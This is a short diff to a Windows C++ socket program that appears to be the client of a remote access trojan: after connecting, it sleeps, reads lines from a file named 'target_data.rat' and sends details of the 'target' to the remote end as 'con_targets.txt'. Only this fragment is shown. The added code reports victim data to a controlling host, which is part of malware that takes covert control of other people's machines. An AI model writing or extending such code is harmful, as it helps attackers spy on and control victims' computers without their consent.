@@ -6,6 +6,7 @@
 #include <thread>
 #include <sstream>                                                              // Include for stringstream
 #include <mutex>
+#include <fstream>
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
@@ -36,6 +37,15 @@ int main()
     while(outerloop)
     {
         connected = socket_setup(sock);
+
+        Sleep(2000);
+
+        std::ifstream file("target_data.rat");
+        std::string lines[3];
+
+        for (int i = 0; i < 3 && std::getline(file, lines[i]); ++i);
+        send_data(sock, "con_targets.txt", lines[1] + " ( " + lines[2] +" )");
+
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
         bool loop = true;
